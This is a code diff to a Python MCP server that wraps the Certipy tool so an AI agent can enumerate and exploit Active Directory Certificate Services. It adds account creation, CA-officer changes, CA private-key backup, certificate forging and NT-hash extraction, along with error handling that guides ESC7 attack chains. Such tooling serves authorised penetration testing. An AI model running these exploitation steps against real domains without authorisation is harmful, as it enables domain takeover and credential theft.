@@ -4,7 +4,7 @@ OpenSploit MCP Server: certipy
 Active Directory Certificate Services enumeration and exploitation via Certipy v5.0.4.
 
 Wraps certipy-ad (pip: certipy-ad, CLI: certipy).
-Subcommands: find, req, auth, shadow, forge, template.
+Subcommands: find, req, auth, shadow, forge, template, ca, account, cert, parse.
 ESC1-ESC16 vulnerability detection and exploitation.
 """
 
@@ -12,6 +12,7 @@ import glob
 import json
 import os
 import re
+import shlex
 import shutil
 import uuid
 from typing import Any, Dict, List, Optional, Set
@@ -107,6 +108,27 @@ class CertipyServer(BaseMCPServer):
             description="Manage Certificate Authority: enable/disable templates, approve/deny certificate requests (ESC7)",
             params=self._ca_params(),
             handler=self.ca,
+        )
+
+        self.register_method(
+            name="account",
+            description="Create, read, update, or delete AD machine/user accounts for ADCS exploitation",
+            params=self._account_params(),
+            handler=self.account,
+        )
+
+        self.register_method(
+            name="cert",
+            description="Convert between certificate formats — extract PEM from PFX, combine key+cert into PFX, strip key or cert",
+            params=self._cert_params(),
+            handler=self.cert,
+        )
+
+        self.register_method(
+            name="parse",
+            description="Offline ADCS analysis — parse BOF output or registry exports without domain access",
+            params=self._parse_params(),
+            handler=self.parse,
         )
 
         # Load dynamic recipes from session
@@ -237,7 +259,7 @@ class CertipyServer(BaseMCPServer):
             env = self._get_auth_env(ccache_path=ccache_path)
 
         try:
-            result = await self.run_command(cmd, timeout=timeout, env=env)
+            result = await self.run_command_with_progress(cmd, env=env)
             combined = result.stdout + result.stderr
             return ToolResult(
                 success=result.returncode == 0,
@@ -458,6 +480,19 @@ class CertipyServer(BaseMCPServer):
                 "type": "string",
                 "description": "User SID for accurate vulnerability assessment. If omitted, certipy uses the authenticated user's SID.",
             },
+            "oids": {
+                "type": "boolean",
+                "default": False,
+                "description": "Show issuance policy OIDs for each template. Useful for ESC13/ESC15 analysis.",
+            },
+            "connection_timeout": {
+                "type": "integer",
+                "description": "Per-connection timeout in seconds (certipy -timeout). Controls LDAP/RPC connection timeout, NOT overall execution timeout.",
+            },
+            "extra_args": {
+                "type": "string",
+                "description": "Additional certipy find flags appended to the command (e.g., '-scheme ldap -port 389'). Flags are split by whitespace and appended safely.",
+            },
         })
         return params
 
@@ -522,6 +557,27 @@ class CertipyServer(BaseMCPServer):
                 "default": False,
                 "description": "Use DCOM transport for certificate request. Workaround for RPC_E_CALL_COMPLETE errors.",
             },
+            "subject": {
+                "type": "string",
+                "description": "Certificate subject DN override (e.g., 'CN=Administrator'). Used in ESC9/ESC10 exploitation.",
+            },
+            "pfx_password": {
+                "type": "string",
+                "description": "Password for enrollment agent PFX file (ESC3). Use when the PFX file is password-protected.",
+            },
+            "renew": {
+                "type": "boolean",
+                "default": False,
+                "description": "Renew an existing certificate instead of requesting a new one.",
+            },
+            "connection_timeout": {
+                "type": "integer",
+                "description": "Per-connection timeout in seconds (certipy -timeout). Controls RPC/LDAP connection timeout, NOT overall execution timeout.",
+            },
+            "extra_args": {
+                "type": "string",
+                "description": "Additional certipy req flags appended to the command (e.g., '-scheme ldap'). Flags are split by whitespace and appended safely.",
+            },
         })
         return params
 
@@ -561,10 +617,27 @@ class CertipyServer(BaseMCPServer):
                 "default": False,
                 "description": "Start LDAP shell after authentication. NOT recommended for MCP (interactive). Use for Schannel auth only.",
             },
+            "username": {
+                "type": "string",
+                "description": "Username override for authentication. Use when the certificate has no UPN embedded (e.g., machine certificates).",
+            },
+            "ns": {
+                "type": "string",
+                "description": "DNS nameserver IP for hostname resolution. Use when container DNS cannot resolve the DC hostname.",
+            },
+            "dns_tcp": {
+                "type": "boolean",
+                "default": False,
+                "description": "Use TCP for DNS queries during authentication. Useful for Docker reliability.",
+            },
             "timeout": {
                 "type": "integer",
                 "default": 120,
                 "description": "Maximum execution time in seconds.",
+            },
+            "extra_args": {
+                "type": "string",
+                "description": "Additional certipy auth flags appended to the command (e.g., '-ldap-shell'). Flags are split by whitespace and appended safely.",
             },
         }
 
@@ -586,6 +659,10 @@ class CertipyServer(BaseMCPServer):
             "device_id": {
                 "type": "string",
                 "description": "Device ID UUID for 'remove' or 'info' actions. Get IDs from 'list' action.",
+            },
+            "extra_args": {
+                "type": "string",
+                "description": "Additional certipy shadow flags appended to the command. Flags are split by whitespace and appended safely.",
             },
         })
         return params
@@ -641,6 +718,10 @@ class CertipyServer(BaseMCPServer):
                 "default": 120,
                 "description": "Maximum execution time in seconds.",
             },
+            "extra_args": {
+                "type": "string",
+                "description": "Additional certipy forge flags appended to the command (e.g., '-issuer CN=CA'). Flags are split by whitespace and appended safely.",
+            },
         }
 
     def _ca_params(self) -> Dict[str, Dict[str, Any]]:
@@ -668,6 +749,32 @@ class CertipyServer(BaseMCPServer):
                 "type": "integer",
                 "description": "Request ID to deny.",
             },
+            "add_officer": {
+                "type": "string",
+                "description": "Add a user as CA officer (ManageCertificates right). Used in ESC7 exploitation to grant certificate issuance permissions.",
+            },
+            "remove_officer": {
+                "type": "string",
+                "description": "Remove a user as CA officer. Used for ESC7 cleanup after exploitation.",
+            },
+            "backup": {
+                "type": "boolean",
+                "default": False,
+                "description": "Extract CA private key and certificate (ESC5/golden certificate). Requires ManageCA rights. Use -config to specify CA.",
+            },
+            "config": {
+                "type": "string",
+                "description": "CA configuration string in 'Machine\\\\CAName' format (e.g., 'DC01\\\\CORP-CA'). Required with -backup to specify which CA to extract.",
+            },
+            "list_templates": {
+                "type": "boolean",
+                "default": False,
+                "description": "List all certificate templates published on the CA.",
+            },
+            "extra_args": {
+                "type": "string",
+                "description": "Additional certipy ca flags appended to the command. Flags are split by whitespace and appended safely.",
+            },
         })
         return params
 
@@ -690,8 +797,172 @@ class CertipyServer(BaseMCPServer):
                 "type": "string",
                 "description": "Path to template configuration JSON file. Required for 'write_config' action. Use config saved by 'save_config' action.",
             },
+            "extra_args": {
+                "type": "string",
+                "description": "Additional certipy template flags appended to the command. Flags are split by whitespace and appended safely.",
+            },
         })
         return params
+
+    def _account_params(self) -> Dict[str, Dict[str, Any]]:
+        """Parameters for the account method."""
+        params = self._auth_params()
+        params.update({
+            "action": {
+                "type": "enum",
+                "values": ["create", "read", "update", "delete"],
+                "default": "read",
+                "description": "Account action. 'create' = create new machine/user account. 'read' = view account properties. 'update' = modify account attributes. 'delete' = remove account.",
+            },
+            "user": {
+                "type": "string",
+                "required": True,
+                "description": "SAM account name of the target account to create/read/update/delete (e.g., 'FAKE01$' for machine, 'newuser' for user).",
+            },
+            "group": {
+                "type": "string",
+                "description": "Group DN to add the account to (e.g., 'CN=Computers,DC=corp,DC=local'). Defaults to CN=Computers container.",
+            },
+            "account_dns": {
+                "type": "string",
+                "description": "DNS hostname for the account (e.g., 'FAKE01.corp.local'). Used with create/update.",
+            },
+            "upn": {
+                "type": "string",
+                "description": "User Principal Name for the account (e.g., 'fake01@corp.local').",
+            },
+            "sam": {
+                "type": "string",
+                "description": "Override SAM account name (e.g., 'FAKE01$').",
+            },
+            "spns": {
+                "type": "string",
+                "description": "Service Principal Names, comma-separated (e.g., 'HOST/FAKE01.corp.local').",
+            },
+            "account_pass": {
+                "type": "string",
+                "description": "Password for the target account (create/update).",
+            },
+            "extra_args": {
+                "type": "string",
+                "description": "Additional certipy account flags appended to the command (e.g., '-no-ldap-channel-binding'). Flags are split by whitespace and appended safely.",
+            },
+        })
+        return params
+
+    def _cert_params(self) -> Dict[str, Dict[str, Any]]:
+        """Parameters for the cert method."""
+        return {
+            "pfx_path": {
+                "type": "string",
+                "description": "Input PFX/P12 file path (e.g., '/session/certipy/admin.pfx').",
+            },
+            "pfx_password": {
+                "type": "string",
+                "description": "Password for the input PFX/P12 file.",
+            },
+            "key_path": {
+                "type": "string",
+                "description": "Input private key file (PEM or DER format).",
+            },
+            "cert_path": {
+                "type": "string",
+                "description": "Input certificate file (PEM or DER format).",
+            },
+            "export": {
+                "type": "boolean",
+                "default": False,
+                "description": "Export to PFX/P12 format. Use to combine separate key + cert files into a PFX.",
+            },
+            "out": {
+                "type": "string",
+                "description": "Output filename (e.g., '/session/certipy/converted.pem'). If omitted, certipy auto-generates.",
+            },
+            "nocert": {
+                "type": "boolean",
+                "default": False,
+                "description": "Exclude certificate from output (key only).",
+            },
+            "nokey": {
+                "type": "boolean",
+                "default": False,
+                "description": "Exclude private key from output (certificate only).",
+            },
+            "export_password": {
+                "type": "string",
+                "description": "Password to protect the output PFX/P12 file.",
+            },
+            "timeout": {
+                "type": "integer",
+                "default": 60,
+                "description": "Maximum execution time in seconds.",
+            },
+            "extra_args": {
+                "type": "string",
+                "description": "Additional certipy cert flags appended to the command. Flags are split by whitespace and appended safely.",
+            },
+        }
+
+    def _parse_params(self) -> Dict[str, Dict[str, Any]]:
+        """Parameters for the parse method."""
+        return {
+            "input_file": {
+                "type": "string",
+                "required": True,
+                "description": "Path to file to parse (BOF output or .reg file from registry export).",
+            },
+            "format": {
+                "type": "enum",
+                "values": ["bof", "reg"],
+                "default": "bof",
+                "description": "Input file format: 'bof' (Beacon Object File output) or 'reg' (Windows .reg registry export).",
+            },
+            "domain": {
+                "type": "string",
+                "description": "Domain name for output context (e.g., 'corp.local'). Only used in labels, not for queries.",
+            },
+            "ca_name": {
+                "type": "string",
+                "description": "CA name for output context. Only used in labels.",
+            },
+            "sids": {
+                "type": "string",
+                "description": "Comma-separated SIDs to consider as owned for vulnerability assessment.",
+            },
+            "published": {
+                "type": "string",
+                "description": "Comma-separated template names to consider as published in AD.",
+            },
+            "vulnerable": {
+                "type": "boolean",
+                "default": False,
+                "description": "Only show vulnerable certificate templates.",
+            },
+            "enabled": {
+                "type": "boolean",
+                "default": False,
+                "description": "Only show enabled certificate templates.",
+            },
+            "hide_admins": {
+                "type": "boolean",
+                "default": False,
+                "description": "Hide administrator permissions in output.",
+            },
+            "output_stdout": {
+                "type": "boolean",
+                "default": False,
+                "description": "Print results to stdout instead of file.",
+            },
+            "timeout": {
+                "type": "integer",
+                "default": 120,
+                "description": "Maximum execution time in seconds.",
+            },
+            "extra_args": {
+                "type": "string",
+                "description": "Additional certipy parse flags appended to the command. Flags are split by whitespace and appended safely.",
+            },
+        }
 
     # ── Helpers ─────────────────────────────────────────────────
 
@@ -725,22 +996,220 @@ class CertipyServer(BaseMCPServer):
         output looks clean.
         """
         error_patterns = [
+            # Authentication errors
             (r"\[-\]\s*LDAP NTLM authentication failed", "LDAP authentication failed"),
             (r"\[-\]\s*Got error:\s*Kerberos authentication failed", "Kerberos authentication failed"),
+            (r"\[-\]\s*NTLM negotiate failed", "Kerberos authentication failed (NTLM negotiate failed)"),
             (r"\[-\]\s*Error during Kerberos authentication", "Kerberos authentication error"),
             (r"\[-\]\s*Got error:\s*No credentials provided", "No credentials provided for TGT request"),
-            (r"\[-\]\s*Got error:\s*socket connection error", "Connection error (socket timeout)"),
+            # Clock skew
+            (r"KRB_AP_ERR_SKEW", "Clock skew too great for Kerberos authentication"),
+            # KDC errors
             (r"\[-\]\s*Kerberos error:.*KDC_ERR", "Kerberos KDC error"),
+            # Connection errors
+            (r"\[-\]\s*Got error:\s*socket connection error", "Connection error (socket timeout)"),
             (r"\[-\]\s*Got error:\s*Failed to get DCE RPC connection", "Failed to establish RPC connection"),
             (r"\[-\]\s*Got error:\s*Could not connect", "Connection failed"),
-            (r"\[-\]\s*Configuration file not found", "Configuration file not found"),
+            (r"\[-\]\s*Failed to connect to.*endpoint mapper", "Failed to connect to endpoint mapper"),
+            (r"\[-\]\s*Failed to connect to LDAP server", "Failed to connect to LDAP server"),
+            # Certificate errors
+            (r"\[-\]\s*Certificate is not valid for client authentication", "Certificate not valid for client authentication"),
             (r"\[-\]\s*Failed to request certificate", "Certificate request failed"),
-            (r"\[-\]\s*Got error:\s*rpc_s_access_denied", "RPC access denied"),
+            (r"CERTSRV_E_TEMPLATE_DENIED", "Template enrollment permission denied (CERTSRV_E_TEMPLATE_DENIED)"),
+            (r"CERTSRV_E_UNSUPPORTED_CERT_TYPE", "Unsupported certificate template (CERTSRV_E_UNSUPPORTED_CERT_TYPE)"),
+            (r"CERTSRV_E_RESTRICTEDOFFICER", "Enrollment agent restrictions apply (CERTSRV_E_RESTRICTEDOFFICER)"),
+            (r"CERTSRV_E_NO_EMAIL_DN", "No email in subject DN (CERTSRV_E_NO_EMAIL_DN)"),
+            (r"CERTSRV_E", "Certificate Services error"),
+            # RPC errors
+            (r"\[-\]\s*Got error:\s*RPC_E_CALL_COMPLETE", "RPC call already complete (RPC_E_CALL_COMPLETE) -- try -dcom flag"),
+            (r"rpc_s_access_denied", "RPC access denied"),
+            # Permission / access errors
+            (r"\[-\]\s*Could not update Key Credentials.*insufficient access rights", "Insufficient access rights to modify msDS-KeyCredentialLink"),
+            (r"\[-\]\s*Could not update Key Credentials", "Failed to update Key Credentials"),
+            # Identity errors
+            (r"\[-\]\s*Username or domain is not specified.*identity information was not found", "No identity information in certificate -- specify -username and -domain"),
+            # Config errors
+            (r"\[-\]\s*Configuration file not found", "Configuration file not found"),
+            # CA management errors
+            (r"\[-\]\s*Access denied:", "Access denied on CA operation"),
+            (r"\[-\]\s*No action specified", "No action specified for CA management"),
+            (r"\[-\]\s*Failed to connect to Service Control Manager", "Failed to connect to Service Control Manager (backup requires admin)"),
+            # Account management errors
+            (r"\[-\]\s*User .+ doesn't have permission to delete", "Insufficient permissions to delete account"),
+            (r"\[-\]\s*User .+ already exists", "Account already exists"),
+            # SMB / logon errors
+            (r"STATUS_LOGON_FAILURE", "SMB logon failure (invalid credentials)"),
         ]
         for pattern, message in error_patterns:
             if re.search(pattern, combined_output):
                 return message
         return None
+
+    def _classify_certipy_error(self, combined_output: str) -> tuple:
+        """Classify certipy error output into (error_class, retryable, suggestions).
+
+        Called by handlers to populate ToolResult error classification fields.
+        Returns: (error_class, retryable, suggestions)
+        """
+        # Clock skew
+        if re.search(r"KRB_AP_ERR_SKEW", combined_output):
+            return ("config", True, [
+                "Set clock_offset parameter to match target DC time",
+                "Clock skew >5 minutes between container and DC",
+            ])
+
+        # NTLM auth failure
+        if re.search(r"LDAP NTLM authentication failed|NTLM negotiate failed", combined_output):
+            return ("auth", False, [
+                "Verify username@domain format and password/hash",
+                "Check if account is locked out or disabled",
+            ])
+
+        # Kerberos auth failure
+        if re.search(r"Kerberos authentication failed", combined_output):
+            return ("auth", False, [
+                "Verify credentials and ensure Kerberos is available",
+                "Try password-based auth instead of Kerberos",
+            ])
+
+        # KDC errors
+        if re.search(r"KDC_ERR_S_PRINCIPAL_UNKNOWN", combined_output):
+            return ("config", True, [
+                "Set -target to the DC FQDN (e.g., DC01.corp.local) for SPN resolution",
+                "Ensure DNS resolves the DC hostname",
+            ])
+        if re.search(r"KDC_ERR", combined_output):
+            return ("config", True, [
+                "Verify Kerberos configuration and target hostname",
+                "Set -target to the DC FQDN for SPN resolution",
+            ])
+
+        # CA backup: Service Control Manager failure (must come before generic "Failed to connect")
+        if re.search(r"Failed to connect to Service Control Manager", combined_output):
+            return ("permission", False, [
+                "CA backup requires local admin or ManageCA rights on the CA server",
+                "Ensure credentials have sufficient privileges for DCOM/RPC access to the CA",
+            ])
+
+        # Connection/network errors
+        if re.search(r"socket connection error|timed out|Could not connect|Failed to connect", combined_output):
+            return ("network", True, [
+                "Check network connectivity to target DC",
+                "Verify DC IP is correct and LDAP port 389/636 is reachable",
+                "Try increasing timeout",
+            ])
+        if re.search(r"Failed to get DCE RPC connection|endpoint mapper", combined_output):
+            return ("network", True, [
+                "RPC endpoint mapper failed -- target may be unreachable or RPC ports blocked",
+                "Try -dcom or -web flag as alternative transport",
+            ])
+
+        # RPC_E_CALL_COMPLETE
+        if re.search(r"RPC_E_CALL_COMPLETE", combined_output):
+            return ("config", True, [
+                "Use dcom=true parameter to switch to DCOM transport",
+                "RPC_E_CALL_COMPLETE indicates the RPC call completed before the handler ran",
+            ])
+
+        # Certificate not valid
+        if re.search(r"Certificate is not valid for client authentication", combined_output):
+            return ("config", False, [
+                "Certificate template lacks Client Authentication EKU",
+                "Wait a few minutes if template was recently changed, then retry",
+                "Request a certificate from a template with Client Authentication EKU",
+            ])
+
+        # Template denied
+        if re.search(r"CERTSRV_E_TEMPLATE_DENIED", combined_output):
+            return ("permission", False, [
+                "User lacks enrollment permission on this template",
+                "Check template ACL for Enroll/AutoEnroll permissions",
+                "Try a different template or user with enrollment rights",
+            ])
+
+        # Unsupported cert type (template not published on CA)
+        if re.search(r"CERTSRV_E_UNSUPPORTED_CERT_TYPE", combined_output):
+            return ("params", False, [
+                "Template is not supported/published on this CA",
+                "Verify the template name (case-sensitive) with 'find' method output",
+                "Template may exist in AD but not be published on this specific CA",
+            ])
+
+        # Enrollment agent restrictions
+        if re.search(r"CERTSRV_E_RESTRICTEDOFFICER", combined_output):
+            return ("permission", False, [
+                "Enrollment agent restrictions block this request",
+                "Try a different enrollment agent certificate or CA",
+            ])
+
+        # Insufficient access (shadow credentials)
+        if re.search(r"insufficient access rights|INSUFF_ACCESS_RIGHTS", combined_output):
+            return ("permission", False, [
+                "No write access to target's msDS-KeyCredentialLink attribute",
+                "Need GenericAll, GenericWrite, or WriteProperty on the target account",
+                "Check bloodhound for accounts with write access to the target",
+            ])
+
+        # No identity in certificate
+        if re.search(r"Username or domain is not specified.*identity information was not found", combined_output):
+            return ("params", False, [
+                "Certificate has no UPN -- specify -username and -domain explicitly",
+                "This certificate may be for a machine account (DNS SAN only)",
+            ])
+
+        # CA management access denied
+        if re.search(r"\[-\]\s*Access denied:", combined_output):
+            return ("permission", False, [
+                "Insufficient CA management permissions",
+                "Need ManageCA right on the CA for template/officer operations",
+            ])
+
+        # RPC access denied
+        if re.search(r"rpc_s_access_denied", combined_output):
+            return ("permission", False, [
+                "RPC access denied -- user lacks CA management permissions",
+                "Need ManageCA or ManageCertificates right on the CA",
+            ])
+
+        # Generic CERTSRV errors
+        if re.search(r"CERTSRV_E", combined_output):
+            return ("permission", False, [
+                "Certificate Services rejected the request",
+                "Check the specific CERTSRV_E error code for details",
+            ])
+
+        # Failed to update key credentials (generic)
+        if re.search(r"Could not update Key Credentials", combined_output):
+            return ("permission", False, [
+                "Failed to modify target's msDS-KeyCredentialLink",
+                "Verify write permissions on the target account",
+            ])
+
+        # Account management errors
+        if re.search(r"doesn't have permission to delete", combined_output):
+            return ("permission", False, [
+                "Insufficient permissions to delete the account",
+                "Account creators typically cannot delete machine accounts -- need domain admin or Account Operators",
+            ])
+        if re.search(r"already exists", combined_output):
+            return ("params", False, [
+                "Account already exists -- use 'update' action instead, or choose a different name",
+            ])
+
+        # CA management: no action specified
+        if re.search(r"No action specified", combined_output):
+            return ("params", False, [
+                "No CA action specified -- use add_officer, backup, enable_template, list_templates, issue_request, etc.",
+            ])
+
+        # SMB logon failure
+        if re.search(r"STATUS_LOGON_FAILURE", combined_output):
+            return ("auth", False, [
+                "SMB authentication failed -- verify credentials",
+                "Account may be locked out or password expired",
+            ])
+
+        return ("unknown", False, [])
 
     def _parse_find_json(self, json_files: List[str]) -> Dict[str, Any]:
         """Parse certipy find JSON output into structured data."""
@@ -778,7 +1247,8 @@ class CertipyServer(BaseMCPServer):
                     "vulnerabilities": [],
                 }
                 # Check for CA-level vulnerabilities
-                vulns = ca_data.get("Vulnerabilities", {})
+                # Certipy v5 uses "[!] Vulnerabilities" key in JSON output
+                vulns = ca_data.get("[!] Vulnerabilities", ca_data.get("Vulnerabilities", {}))
                 if vulns:
                     for esc_id, vuln_info in vulns.items():
                         ca_info["vulnerabilities"].append(esc_id)
@@ -818,14 +1288,19 @@ class CertipyServer(BaseMCPServer):
             "domain": None,
         }
 
-        # Look for NT hash: "Got hash for 'user@domain': aad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0"
-        hash_match = re.search(r"Got hash for '([^']+)':\s+(\S+)", output)
+        # Look for NT hash — certipy uses both "Got hash for" and "NT hash for"
+        hash_match = re.search(r"(?:Got hash|NT hash) for '([^']+)':\s+(\S+)", output)
         if hash_match:
-            result["username"] = hash_match.group(1)
+            identity = hash_match.group(1)
             result["nt_hash"] = hash_match.group(2)
+            if "@" in identity:
+                result["username"] = identity.split("@")[0]
+            else:
+                result["username"] = identity
 
         # Look for ccache/kirbi file paths
-        ccache_match = re.search(r"Saved credential cache to '([^']+)'", output)
+        # Certipy outputs: "Saved credential cache to 'user.ccache'" or "Wrote credential cache to 'user.ccache'"
+        ccache_match = re.search(r"(?:Saved|Wrote) credential cache to '([^']+)'", output)
         if ccache_match:
             result["ccache_path"] = ccache_match.group(1)
 
@@ -833,8 +1308,9 @@ class CertipyServer(BaseMCPServer):
         if kirbi_match:
             result["kirbi_path"] = kirbi_match.group(1)
 
-        # Domain from output
-        domain_match = re.search(r"Using principal:\s+(\S+)@(\S+)", output)
+        # Domain from output — certipy prints "Using principal: 'user@domain'" (with quotes)
+        # or "Using principal: user@domain" (without quotes)
+        domain_match = re.search(r"Using principal:\s+'?(\S+?)@(\S+?)'?\s*$", output, re.MULTILINE)
         if domain_match:
             result["username"] = domain_match.group(1)
             result["domain"] = domain_match.group(2)
@@ -850,23 +1326,34 @@ class CertipyServer(BaseMCPServer):
             "key_credentials": [],
         }
 
-        # NT hash from auto mode
-        hash_match = re.search(r"Got hash for '([^']+)':\s+(\S+)", output)
+        # NT hash from auto mode — certipy uses both "Got hash for" and "NT hash for"
+        hash_match = re.search(r"(?:Got hash|NT hash) for '([^']+)':\s+(\S+)", output)
         if hash_match:
             result["nt_hash"] = hash_match.group(2)
 
-        # PFX file saved
-        pfx_match = re.search(r"Saved certificate and private key to '([^']+)'", output)
+        # PFX file saved — certipy uses both phrasings
+        pfx_match = re.search(r"(?:Saved|Wrote) certificate and private key to '([^']+)'", output)
         if pfx_match:
             result["pfx_path"] = pfx_match.group(1)
 
-        # Device ID from add
-        device_match = re.search(r"Device ID:\s+([0-9a-f-]+)", output, re.IGNORECASE)
+        # Device ID from add/auto — certipy v5 outputs multiple formats:
+        #   "Key Credential generated with DeviceID 'e5e51e7305e043b0b94a1ee98db24854'"
+        #   "Adding Key Credential with device ID 'e5e51e7305e043b0b94a1ee98db24854'"
+        #   "DeviceID: a1b2c3d4-e5f6-a7b8-c9d0-e1f2a3b4c5d6"
+        device_match = re.search(
+            r"(?:DeviceID|device ID|Device ID)[:\s]+'?([0-9a-f-]+)'?",
+            output, re.IGNORECASE
+        )
         if device_match:
-            result["device_id"] = device_match.group(1)
+            result["device_id"] = device_match.group(1).strip("'")
 
-        # Key credential listing
-        for match in re.finditer(r"DeviceID:\s+([^\n]+).*?Owner:\s+([^\n]+)", output, re.DOTALL):
+        # Key credential listing — certipy list output format:
+        #   DeviceID: a1b2c3d4-e5f6-a7b8-c9d0-e1f2a3b4c5d6
+        #   Owner: svc_backup
+        for match in re.finditer(
+            r"DeviceID:\s+([^\n]+?)[\s\n]+.*?Owner:\s+([^\n]+)",
+            output, re.DOTALL
+        ):
             result["key_credentials"].append({
                 "device_id": match.group(1).strip(),
                 "owner": match.group(2).strip(),
@@ -893,6 +1380,9 @@ class CertipyServer(BaseMCPServer):
         dc_only: bool = False,
         stdout: bool = False,
         user_sid: Optional[str] = None,
+        oids: bool = False,
+        connection_timeout: Optional[int] = None,
+        extra_args: Optional[str] = None,
         timeout: int = 300,
     ) -> ToolResult:
         """Enumerate AD CS — discover CAs, templates, and vulnerabilities."""
@@ -927,11 +1417,29 @@ class CertipyServer(BaseMCPServer):
             cmd.append("-stdout")
         if user_sid:
             cmd.extend(["-sid", user_sid])
+        if oids:
+            cmd.append("-oids")
+        if connection_timeout is not None:
+            cmd.extend(["-timeout", str(connection_timeout)])
+        if extra_args:
+            cmd.extend(shlex.split(extra_args))
 
         auth_env = self._get_auth_env(ccache_path=ccache_path) if kerberos else {}
         combined = ""
+
+        def _find_progress(line: str) -> Optional[str]:
+            """Extract meaningful progress from certipy find output."""
+            if "[*] Enumerating" in line:
+                return line.strip().lstrip("[*] ")
+            if "[*] Found" in line:
+                return line.strip().lstrip("[*] ")
+            return None
+
         try:
-            result = await self.run_command(cmd, timeout=timeout, env=auth_env)
+            result = await self.run_command_with_progress(
+                cmd, env=auth_env,
+                progress_filter=_find_progress,
+            )
             combined = result.stdout + result.stderr
 
             new_files = self._find_new_files(before)
@@ -944,6 +1452,11 @@ class CertipyServer(BaseMCPServer):
             # Detect certipy errors (certipy often exits 0 even on auth failure)
             certipy_error = self._detect_certipy_error(combined)
             is_success = certipy_error is None or len(json_files) > 0
+
+            # Classify error if detected
+            error_class, retryable, suggestions = (None, False, [])
+            if certipy_error and not is_success:
+                error_class, retryable, suggestions = self._classify_certipy_error(combined)
 
             return ToolResult(
                 success=is_success,
@@ -961,6 +1474,9 @@ class CertipyServer(BaseMCPServer):
                 },
                 raw_output=sanitize_output(combined),
                 error=certipy_error if not is_success else None,
+                error_class=error_class,
+                retryable=retryable,
+                suggestions=suggestions,
             )
         except Exception as e:
             return ToolResult(success=False, error=str(e), raw_output=sanitize_output(combined))
@@ -989,6 +1505,11 @@ class CertipyServer(BaseMCPServer):
         web: bool = False,
         application_policies: Optional[str] = None,
         dcom: bool = False,
+        subject: Optional[str] = None,
+        pfx_password: Optional[str] = None,
+        renew: bool = False,
+        connection_timeout: Optional[int] = None,
+        extra_args: Optional[str] = None,
         timeout: int = 300,
     ) -> ToolResult:
         """Request a certificate from a CA."""
@@ -1031,6 +1552,23 @@ class CertipyServer(BaseMCPServer):
             cmd.extend(["-pfx", pfx_path])
         if retrieve is not None:
             cmd.extend(["-retrieve", str(retrieve)])
+            # ESC7 retrieve: certipy looks for {request_id}.key in CWD to
+            # combine with the retrieved cert into a PFX.  The key was saved
+            # during the original denied request with a different filename
+            # (using our -out prefix).  Find any .key file on disk and
+            # symlink it as {request_id}.key so certipy can find it.
+            expected_key = os.path.join(WORK_DIR, f"{retrieve}.key")
+            if not os.path.exists(expected_key):
+                # Search for key files in the working directory
+                key_candidates = sorted(
+                    [f for f in os.listdir(WORK_DIR) if f.endswith(".key")],
+                    key=lambda f: os.path.getmtime(os.path.join(WORK_DIR, f)),
+                    reverse=True,
+                )
+                if key_candidates:
+                    src = os.path.join(WORK_DIR, key_candidates[0])
+                    os.symlink(src, expected_key)
+                    self.logger.info(f"Symlinked {src} -> {expected_key} for retrieve")
         if key_size != 2048:
             cmd.extend(["-key-size", str(key_size)])
         if web:
@@ -1039,15 +1577,34 @@ class CertipyServer(BaseMCPServer):
             cmd.extend(["-application-policies", application_policies])
         if dcom:
             cmd.append("-dcom")
+        if subject:
+            cmd.extend(["-subject", subject])
+        if pfx_password:
+            cmd.extend(["-pfx-password", pfx_password])
+        if renew:
+            cmd.append("-renew")
+        if connection_timeout is not None:
+            cmd.extend(["-timeout", str(connection_timeout)])
+        if extra_args:
+            cmd.extend(shlex.split(extra_args))
+
+        # Certipy prompts "Would you like to save the private key? (y/N):"
+        # when a certificate request is denied (e.g., ESC7 SubCA flow).
+        # Since run_command_with_progress uses stdin=DEVNULL, the prompt gets
+        # EOF and the key is not saved.  Wrap with `yes` to auto-confirm.
+        # This is safe — the prompt only appears on denial and saving the key
+        # is always desired (needed for ESC7 -retrieve after -issue-request).
+        wrapped_cmd = ["bash", "-c", "yes | " + " ".join(shlex.quote(c) for c in cmd)]
 
         auth_env = self._get_auth_env(ccache_path=ccache_path) if kerberos else {}
         combined = ""
         try:
-            result = await self.run_command(cmd, timeout=timeout, env=auth_env)
+            result = await self.run_command_with_progress(wrapped_cmd, env=auth_env)
             combined = result.stdout + result.stderr
 
             new_files = self._find_new_files(before)
             pfx_files = [f for f in new_files if f.endswith(".pfx")]
+            key_files = [f for f in new_files if f.endswith(".key")]
 
             # Check for request ID (pending approval scenario - ESC7)
             request_id = None
@@ -1055,22 +1612,63 @@ class CertipyServer(BaseMCPServer):
             if id_match:
                 request_id = int(id_match.group(1))
 
+            certipy_error = self._detect_certipy_error(combined)
+
+            # ESC7 flow: a DENIED request with a valid request_id is a
+            # *partial success* — the request ID and saved private key are
+            # needed for the next steps (ca -issue-request, then req -retrieve).
+            # Treat CERTSRV_E_TEMPLATE_DENIED as success when we got a request_id.
+            # Check the raw output (not the error message) because certipy prints
+            # both "CERTSRV_E_TEMPLATE_DENIED" and "Failed to request certificate"
+            # and _detect_certipy_error may match the latter first.
+            is_denied_with_id = (
+                request_id is not None
+                and certipy_error is not None
+                and "CERTSRV_E_TEMPLATE_DENIED" in combined
+            )
+
+            if is_denied_with_id:
+                # Partial success: denied but we have the request ID (+ key if saved)
+                is_success = True
+                denial_note = (
+                    f"Request denied (CERTSRV_E_TEMPLATE_DENIED) but request ID {request_id} captured. "
+                    "ESC7 workflow: use ca method with issue_request={} to approve, "
+                    "then request method with retrieve={} to get the certificate."
+                ).format(request_id, request_id)
+                if key_files:
+                    denial_note += f" Private key saved to {key_files[0]}."
+                certipy_error = None
+                error_class, retryable, suggestions = (None, False, [])
+            else:
+                is_success = (len(pfx_files) > 0 or request_id is not None) and certipy_error is None
+                error_class, retryable, suggestions = (None, False, [])
+                denial_note = None
+                if not is_success:
+                    if certipy_error:
+                        error_class, retryable, suggestions = self._classify_certipy_error(combined)
+                    else:
+                        certipy_error = "No PFX file generated and no request ID returned -- check CA name, template, and permissions"
+
             return ToolResult(
-                success=len(pfx_files) > 0 or request_id is not None,
+                success=is_success,
                 data={
                     "method": "request",
                     "ca": ca,
                     "template": template,
                     "pfx_path": pfx_files[0] if pfx_files else None,
+                    "key_path": key_files[0] if key_files else None,
                     "request_id": request_id,
                     "upn": upn,
                     "dns": dns,
                     "on_behalf_of": on_behalf_of,
                     "output_files": new_files,
+                    "denial_note": denial_note,
                 },
                 raw_output=sanitize_output(combined),
-                error="No PFX file generated and no request ID returned — check CA name, template, and permissions"
-                if not pfx_files and request_id is None else None,
+                error=certipy_error,
+                error_class=error_class,
